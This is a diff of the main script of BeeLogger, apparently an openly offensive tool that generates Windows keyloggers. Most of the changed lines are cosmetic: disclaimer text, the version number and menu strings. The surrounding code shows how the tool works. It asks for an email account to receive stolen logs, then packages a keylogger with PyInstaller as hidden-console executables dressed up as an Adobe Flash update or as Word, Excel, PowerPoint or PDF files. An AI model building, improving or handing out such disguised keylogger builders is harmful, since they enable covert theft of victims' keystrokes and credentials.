@@ -1,5 +1,5 @@
-#/usr/bin/python
-# -*- coding: iso-8859-15 -*-
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 # Copyright 2017 BeeLogger
 # Written by: * Alisson Moretto - 4w4k3
 # https://github.com/4w4k3/BeeLogger
@@ -16,10 +16,10 @@ def begin():
     email = raw_input('Type your email to receive logs: ')
     epass = raw_input('Type your email password: ')
     print '\n'
-    print '###############################'
-    print ' email: ' + email
-    print ' password: ' + epass
-    print '###############################'
+    print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
+    print '\n   email: ' + email
+    print '   password: ' + epass 
+    print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n'    
     ask = raw_input('These info above are correct? (y/n) :')
     if ask == 'y':
@@ -59,10 +59,10 @@ def warn():
    *:ZZZZZZZ       %%%%%%%%%%%%%%%%%%%%%ZZZZ    ZZZZZZZ
   *::::ZZZZZZ         %%%%%%%%%%%%%%%ZZZZZZZ      ZZZ
    *::ZZZZZZ           Z%%%%%%%%%%%ZZZZZZZ%%
-     ZZZZ              ZZZZZZZZZZZZZZZZ%%%%%''' + RED + '''  # Dɪsᴄʟᴀɪᴍᴇʀ Aʟᴇʀᴛ #''' + YELLOW +  ''' 
-                      %%%ZZZZZZZZZZZ%%%%%%%%''' + WHITE + '''  Nᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ꜰᴏʀ ᴍɪsᴜsᴇ ''' + YELLOW + '''
-                     Z%%%%%%%%%%%%%%%%%%%%%''' + WHITE + '''  ᴀɴᴅ ꜰᴏʀ ɪʟʟᴇɢᴀʟ ᴘᴜʀᴘᴏsᴇs.''' + YELLOW + '''
-                     ZZ%%%%%%%%%%%%%%%%%%%''' + WHITE + ''' Usᴇ ɪᴛ ᴊᴜsᴛ ꜰᴏʀ''' + RED + ''' ᴡᴏʀᴋ''' + WHITE + ''' ᴏʀ ''' + RED + '''ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ''' + WHITE + ''' !
+     ZZZZ              ZZZZZZZZZZZZZZZZ%%%%%''' + RED + '''  # Disclaimer Alert #''' + YELLOW +  ''' 
+                      %%%ZZZZZZZZZZZ%%%%%%%%''' + WHITE + '''  Not Responsible For Misuse ''' + YELLOW + '''
+                     Z%%%%%%%%%%%%%%%%%%%%%''' + WHITE + '''  And For Illegal Purposes.''' + YELLOW + '''
+                     ZZ%%%%%%%%%%%%%%%%%%%''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
 ''')
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
@@ -72,27 +72,17 @@ def heading():
     sys.stdout.write(YELLOW + '''
 
                 .' '. I BEE YOU  __
-       .        .   .          \(__\_/             Version: 1.0
+       .        .   .          \(__\_/             Version: 2.0
         .         .         . -{{#(|8)
           ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
     print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
 def pp():
     sys.stdout.write(GREEN + '''Thank You for using Bee, Think Great, Fly High!  \n''' + END)
 def option():
-    print ' {0}[{1}1{0}]{1} Aᴅᴏʙᴇ Fʟᴀsʜ Uᴘᴅᴀᴛᴇ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fᴀᴋᴇ Wᴏʀᴅ ᴅᴏᴄx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fᴀᴋᴇ Pᴏᴡᴇʀᴘᴏɪɴᴛ ᴘᴘᴛx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fᴀᴋᴇ Aᴄʀᴏʙᴀᴛ ᴘᴅꜰ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Bʟᴀɴᴋ Exᴇᴄᴜᴛᴀʙʟᴇ '.format(BLUE, WHITE) 
+    print ' {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fake Word docx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fᴀᴋᴇ Powerpoint pptx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fake Acrobat pdf '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Blank Executable '.format(BLUE, WHITE) 
 def main():
     clear()
-    path = '.OK'
-    if os.path.isdir(path):
-        pass
-    else:
-        ab = raw_input('Dependencies not found, Do you want install it? (y/n): ')
-        if ab.upper() == 'Y':
-            os.system('sudo python2.7 checker.py')
-        elif ab.upper() == 'YES':
-            os.system('sudo python2.7 checker.py')
-        else:
-            sys.exit(0)
+    os.system("python2.7 look.py")
     clear()
     warn()
     raw_input('                                                PRESS [ENTER] TO CONTINUE')
@@ -121,7 +111,7 @@ def main():
                 clear()
                 heading()
                 os.system('sudo rm -Rf Templates/k_enc.py')
-                print '\n {0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
+                print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice == '1':
                 begin()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
@@ -130,7 +120,7 @@ def main():
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
                 heading()                              
-                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name           
+                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name           
             elif choice == '2':
                 begin()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
@@ -139,7 +129,7 @@ def main():
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
                 heading()                                              
-                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
+                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '3':
                 begin()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
@@ -148,7 +138,7 @@ def main():
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
                 heading()                                              
-                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
+                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '4':
                 begin()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
@@ -157,7 +147,7 @@ def main():
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear() 
                 heading()                                              
-                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
+                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '5':
                 begin()
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
@@ -166,7 +156,7 @@ def main():
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
                 heading()                                              
-                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
+                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice.upper() == 'U' or choice.upper() == 'UPDATE':
 		os.system('python2.7 updater.py')
             if choice.upper() == 'EXIT' or choice.upper() == 'CLOSE':
